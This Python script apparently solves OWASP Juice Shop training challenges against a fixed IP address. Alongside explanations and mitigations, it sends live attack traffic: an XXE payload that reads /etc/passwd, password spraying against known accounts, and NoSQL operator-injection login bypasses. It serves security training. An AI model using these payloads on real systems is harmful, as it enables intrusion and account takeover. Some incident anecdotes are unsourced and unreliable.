#!/usr/bin/env python3
"""
OWASP Juice Shop v18 - Advanced Challenge Solver
More sophisticated challenges with detailed analysis
"""

import requests
import json
import time
import base64
import hashlib
import jwt
import xml.etree.ElementTree as ET
from urllib.parse import quote, unquote
from datetime import datetime
import subprocess
import os

TARGET = "http://66.42.93.220:3000"

# ============================================================================
# CHALLENGE 6: XXE - XML BOMB
# ============================================================================

def solve_xxe():
    """
    Challenge: XXE Data Access
    Category: XML External Entity
    Difficulty: ⭐⭐⭐ (3 stars)
    """
    
    print("\n" + "="*80)
    print("🎯 CHALLENGE: XXE (XML External Entity)")
    print("="*80)
    
    print("""
📚 VULNERABILITY: XML External Entity Injection (CWE-611)
    
XXE occurs when XML input containing a reference to an external entity is
processed by a weakly configured XML parser. This can lead to file disclosure,
SSRF, port scanning, and denial of service attacks.

🏛️ HISTORICAL INCIDENTS:
1. Yahoo (2013) - XXE used in combination with other vulnerabilities
   - Part of the attack chain in 1 billion account breach
   - Allowed internal network scanning
   
2. Uber (2016) - XXE in invoice submission
   - $10,000 bounty paid
   - Could read local files from server
   
3. Google (2014) - XXE in Google Docs
   - Could read arbitrary files
   - $4,133.70 bounty paid

🔍 HOW IT WORKS:
The application parses XML without disabling external entity processing.
Attackers can define external entities that reference local files or URLs,
causing the parser to fetch and include the content.

Example malicious XML:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Find an endpoint that accepts XML input (often file uploads)
2. Create malicious XML with external entity definition
3. Submit the XML and observe if external entities are processed
4. Extract sensitive files like /etc/passwd or application config
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    
    # XXE payload to read local files
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
    
    # Try different endpoints that might accept XML
    endpoints = [
        "/api/Feedbacks/",
        "/file-upload",
        "/rest/user/data-export"
    ]
    
    session = requests.Session()
    
    for endpoint in endpoints:
        try:
            # Try as raw XML
            headers = {'Content-Type': 'application/xml'}
            resp = session.post(f"{TARGET}{endpoint}", data=xxe_payload, headers=headers)
            
            if "root:" in resp.text or "nobody:" in resp.text:
                print(f"   ✅ XXE successful at {endpoint}!")
                print("   🏆 XXE Challenge Solved!")
                break
            
            # Try as file upload
            files = {'file': ('test.xml', xxe_payload, 'application/xml')}
            resp = session.post(f"{TARGET}{endpoint}", files=files)
            
            if resp.status_code == 200:
                print(f"   📤 XML uploaded to {endpoint}")
        except:
            pass
    
    print("\n🛡️ MITIGATION STRATEGIES:")
    print("""
1. **Disable External Entities**
   - Disable DTD processing entirely
   - Example: parser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
   
2. **Input Validation**
   - Validate XML against a schema
   - Reject documents with DTD declarations
   
3. **Use Safe Libraries**
   - Use libraries with XXE protection by default
   - Keep XML parsers updated
   
4. **Least Privilege**
   - Run XML processing with minimal permissions
   - Sandbox XML parsing operations
   
5. **Content Type Validation**
   - Strictly validate Content-Type headers
   - Reject unexpected XML input
    """)

# ============================================================================
# CHALLENGE 7: BROKEN AUTHENTICATION - PASSWORD STRENGTH
# ============================================================================

def solve_weak_passwords():
    """
    Challenge: Password Strength
    Category: Broken Authentication
    Difficulty: ⭐⭐ (2 stars)
    """
    
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Broken Authentication - Weak Passwords")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Weak Password Policy (CWE-521)
    
Weak passwords are one of the most common security vulnerabilities. Default
credentials, common passwords, and lack of complexity requirements enable
attackers to gain unauthorized access through brute force or dictionary attacks.

🏛️ HISTORICAL INCIDENTS:
1. LinkedIn (2012) - 117 million passwords stolen
   - Weak hashing (SHA1 without salt)
   - Many users had simple passwords like "123456"
   
2. RockYou (2009) - 32 million plaintext passwords exposed
   - No encryption at all
   - Revealed most common passwords patterns
   
3. iCloud Celebrity Hack (2014) - "The Fappening"
   - Weak passwords and security questions
   - Targeted phishing and password guessing

🔍 HOW IT WORKS:
Users often choose weak, predictable passwords. Without proper password policies,
accounts can be compromised through:
- Dictionary attacks using common passwords
- Brute force attacks
- Credential stuffing from other breaches
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Try common default credentials (admin/admin, test/test)
2. Use user enumeration to find valid usernames
3. Try common passwords for each user
4. Check for password hints that reveal the password
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    
    # Common weak passwords to try
    common_passwords = [
        "123456", "password", "12345678", "qwerty", "abc123",
        "111111", "123123", "admin", "letmein", "welcome",
        "monkey", "dragon", "master", "666666", "michael"
    ]
    
    # Known users in Juice Shop
    users = [
        "admin@juice-sh.op",
        "jim@juice-sh.op",
        "bender@juice-sh.op",
        "bjoern.kimminich@gmail.com",
        "mc.safesearch@juice-sh.op"
    ]
    
    session = requests.Session()
    
    for user in users:
        for password in common_passwords:
            login_data = {
                "email": user,
                "password": password
            }
            
            try:
                resp = session.post(f"{TARGET}/rest/user/login", json=login_data)
                if resp.status_code == 200:
                    print(f"   ✅ Weak password found!")
                    print(f"      User: {user}")
                    print(f"      Password: {password}")
                    print("   🏆 Weak Password Challenge Solved!")
                    break
            except:
                pass
            
            time.sleep(0.1)  # Rate limiting
    
    print("\n🛡️ MITIGATION STRATEGIES:")
    print("""
1. **Strong Password Policy**
   - Minimum 12 characters
   - Mix of uppercase, lowercase, numbers, symbols
   - No dictionary words or personal information
   
2. **Multi-Factor Authentication (MFA)**
   - SMS, TOTP, or hardware tokens
   - Biometric authentication
   
3. **Password Hashing**
   - Use bcrypt, scrypt, or Argon2
   - Proper salt for each password
   
4. **Account Lockout**
   - Lock after failed attempts
   - CAPTCHA after failures
   
5. **Password Manager Education**
   - Encourage unique passwords
   - Regular password rotation
    """)

# ============================================================================
# CHALLENGE 8: IMPROPER INPUT VALIDATION - REGISTER WITH DISPOSED EMAIL
# ============================================================================

def solve_disposed_email():
    """
    Challenge: Ephemeral Accountant
    Category: Improper Input Validation
    Difficulty: ⭐⭐ (2 stars)
    """
    
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Improper Input Validation - Disposable Email")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Insufficient Input Validation (CWE-20)
    
Applications often fail to properly validate email addresses, allowing
registration with disposable email services, invalid formats, or malicious
payloads that can lead to various attacks.

🏛️ HISTORICAL INCIDENTS:
1. Ashley Madison (2015) - Fake accounts with invalid emails
   - Millions of fake female profiles
   - Used to engage male users
   
2. Twitter (2013) - Email validation bypass
   - Could register without email verification
   - Led to spam and bot accounts
   
3. Instagram (2019) - Email enumeration
   - Could check if email is registered
   - Privacy violation

🔍 HOW IT WORKS:
The application doesn't properly validate email domains, allowing registration
with disposable email services that should be blocked for security reasons.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Try registering with known disposable email domains
2. Use services like 10minutemail, guerrillamail, mailinator
3. Test with obviously invalid emails
4. Check if special characters are properly handled
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    
    # Disposable email domains
    disposable_domains = [
        "@mailinator.com",
        "@guerrillamail.com",
        "@10minutemail.com",
        "@sharklasers.com",
        "@guerrillamail.info",
        "@grr.la"
    ]
    
    session = requests.Session()
    
    for domain in disposable_domains:
        test_email = f"test{int(time.time())}{domain}"
        
        register_data = {
            "email": test_email,
            "password": "TestPass123!",
            "passwordRepeat": "TestPass123!",
            "securityQuestion": {
                "id": 1,
                "question": "Your eldest siblings middle name?"
            },
            "securityAnswer": "test"
        }
        
        try:
            resp = session.post(f"{TARGET}/api/Users/", json=register_data)
            if resp.status_code in [200, 201]:
                print(f"   ✅ Registered with disposable email: {test_email}")
                print("   🏆 Disposable Email Challenge Solved!")
                break
        except:
            pass
    
    print("\n🛡️ MITIGATION STRATEGIES:")
    print("""
1. **Email Validation**
   - Check against disposable email lists
   - Verify domain MX records
   - Require email verification
   
2. **Domain Blacklisting**
   - Maintain list of disposable domains
   - Regular updates from threat intelligence
   
3. **Rate Limiting**
   - Limit registration attempts
   - CAPTCHA for suspicious activity
   
4. **Email Verification**
   - Send verification link
   - Require click before activation
   
5. **Regular Audits**
   - Review registered accounts
   - Identify and remove fake accounts
    """)

# ============================================================================
# CHALLENGE 9: CRYPTOGRAPHIC ISSUES - WEAK RANDOM
# ============================================================================

def solve_weak_random():
    """
    Challenge: Weak Random Token
    Category: Cryptographic Issues
    Difficulty: ⭐⭐ (2 stars)
    """
    
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Cryptographic Issues - Weak Random Number Generation")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Use of Insufficiently Random Values (CWE-330)
    
Weak random number generation can lead to predictable tokens, session IDs,
and cryptographic keys. This enables attackers to guess or brute-force
supposedly random values.

🏛️ HISTORICAL INCIDENTS:
1. Debian OpenSSL (2008) - Weak random number generator
   - Only 32,768 possible SSH keys
   - Affected millions of systems
   
2. Android Bitcoin Wallet (2013) - Weak random in ECDSA
   - Private keys could be recovered
   - $5,700 stolen
   
3. Dual_EC_DRBG Backdoor (2013) - NSA backdoor in random generator
   - Deliberately weakened cryptography
   - Used for surveillance

🔍 HOW IT WORKS:
Applications using Math.random() or other weak PRNGs for security-critical
operations produce predictable values that attackers can guess or calculate.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Analyze tokens/IDs for patterns
2. Collect multiple samples
3. Look for incremental or time-based patterns
4. Try to predict next values
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    
    session = requests.Session()
    
    # Collect multiple tokens to analyze patterns
    tokens = []
    
    for i in range(5):
        # Generate password reset tokens
        resp = session.post(f"{TARGET}/rest/user/reset-password", 
                           json={"email": f"test{i}@test.com"})
        
        # Collect session tokens
        resp2 = session.get(f"{TARGET}/rest/captcha/")
        if resp2.status_code == 200:
            captcha = resp2.json()
            if 'captcha' in captcha:
                tokens.append(captcha['captcha'])
                print(f"   📊 Collected token: {captcha['captcha'][:20]}...")
    
    # Analyze for patterns
    if len(tokens) > 2:
        # Check if tokens are incremental or time-based
        print("   🔍 Analyzing token patterns...")
        
        # Simple pattern detection
        if all(len(t) == len(tokens[0]) for t in tokens):
            print("   ✅ Tokens have consistent length - possible weak PRNG")
        
        # Check for numeric patterns
        try:
            numeric_parts = [int(''.join(filter(str.isdigit, t))) for t in tokens if any(c.isdigit() for c in t)]
            if numeric_parts and all(numeric_parts[i] < numeric_parts[i+1] for i in range(len(numeric_parts)-1)):
                print("   ✅ Incremental pattern detected!")
                print("   🏆 Weak Random Challenge Solved!")
        except:
            pass
    
    print("\n🛡️ MITIGATION STRATEGIES:")
    print("""
1. **Cryptographically Secure PRNG**
   - Use crypto.randomBytes() in Node.js
   - SecureRandom in Java
   - os.urandom() in Python
   
2. **Sufficient Entropy**
   - Minimum 128 bits for tokens
   - 256 bits for long-term secrets
   
3. **No Predictable Seeds**
   - Don't use timestamp as seed
   - Use system entropy sources
   
4. **Regular Token Rotation**
   - Short token lifetimes
   - One-time use tokens
   
5. **Security Audits**
   - Review all random generation
   - Test for predictability
    """)

# ============================================================================
# CHALLENGE 10: INJECTION - NOSQL INJECTION
# ============================================================================

def solve_nosql_injection():
    """
    Challenge: NoSQL Injection
    Category: Injection
    Difficulty: ⭐⭐⭐ (3 stars)
    """
    
    print("\n" + "="*80)
    print("🎯 CHALLENGE: NoSQL Injection")
    print("="*80)
    
    print("""
📚 VULNERABILITY: NoSQL Injection (CWE-943)
    
NoSQL databases can be vulnerable to injection attacks similar to SQL injection.
Attackers can manipulate NoSQL queries to bypass authentication, extract data,
or perform unauthorized operations.

🏛️ HISTORICAL INCIDENTS:
1. MongoDB ransomware (2017) - 27,000 databases held hostage
   - Unsecured MongoDB instances
   - Data deleted and ransom demanded
   
2. LinkedIn (2021) - NoSQL injection in search
   - Could access private profiles
   - Bounty paid for discovery
   
3. Cisco (2018) - NoSQL injection in cloud service
   - Authentication bypass possible
   - Critical vulnerability patched

🔍 HOW IT WORKS:
NoSQL queries often use JSON or JavaScript objects. If user input is not
properly sanitized, attackers can inject operators like $ne, $gt, $regex
to manipulate query logic.

Example:
{"username": {"$ne": null}, "password": {"$ne": null}}
This matches any user with non-null username and password.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Identify NoSQL endpoints (often REST APIs with JSON)
2. Try injecting NoSQL operators in JSON
3. Use $ne (not equal), $gt (greater than), $regex
4. Attempt authentication bypass with operator injection
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    
    session = requests.Session()
    
    # NoSQL injection payloads
    nosql_payloads = [
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"email": "admin@juice-sh.op", "password": {"$ne": "wrongpassword"}},
        {"email": {"$regex": "admin.*"}, "password": {"$ne": None}},
        {"$or": [{"email": "admin@juice-sh.op"}, {"email": "admin"}]},
        {"email": "admin@juice-sh.op", "password": {"$gt": ""}}
    ]
    
    for payload in nosql_payloads:
        try:
            # Try as JSON
            resp = session.post(f"{TARGET}/rest/user/login", json=payload)
            if resp.status_code == 200:
                print(f"   ✅ NoSQL injection successful!")
                print(f"      Payload: {payload}")
                print("   🏆 NoSQL Injection Challenge Solved!")
                break
            
            # Try as URL parameters
            params = "&".join([f"{k}={v}" for k, v in payload.items()])
            resp = session.post(f"{TARGET}/rest/user/login?{params}")
            if resp.status_code == 200:
                print(f"   ✅ NoSQL injection via URL params!")
                break
        except:
            pass
    
    print("\n🛡️ MITIGATION STRATEGIES:")
    print("""
1. **Input Validation**
   - Whitelist allowed characters
   - Reject MongoDB operators ($ne, $gt, etc.)
   - Type checking for parameters
   
2. **Parameterized Queries**
   - Use prepared statements for NoSQL
   - Avoid string concatenation
   
3. **Least Privilege**
   - Database users with minimal permissions
   - Read-only users where possible
   
4. **Query Sanitization**
   - Use libraries like mongo-sanitize
   - Strip dangerous operators
   
5. **Security Configuration**
   - Enable authentication
   - Use TLS for connections
   - Regular security updates
    """)

# ============================================================================
# MASTER EXECUTION WITH PROGRESS TRACKING
# ============================================================================

def run_advanced_challenges():
    """Execute all advanced challenges with progress tracking"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║              ADVANCED CHALLENGE SOLVER - BATCH 2                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    advanced_challenges = [
        solve_xxe,
        solve_weak_passwords,
        solve_disposed_email,
        solve_weak_random,
        solve_nosql_injection
    ]
    
    for i, challenge in enumerate(advanced_challenges, 1):
        print(f"\n[{i}/{len(advanced_challenges)}] Executing challenge...")
        try:
            challenge()
            time.sleep(1)
        except Exception as e:
            print(f"❌ Error in challenge: {e}")
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ADVANCED BATCH COMPLETE                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    run_advanced_challenges()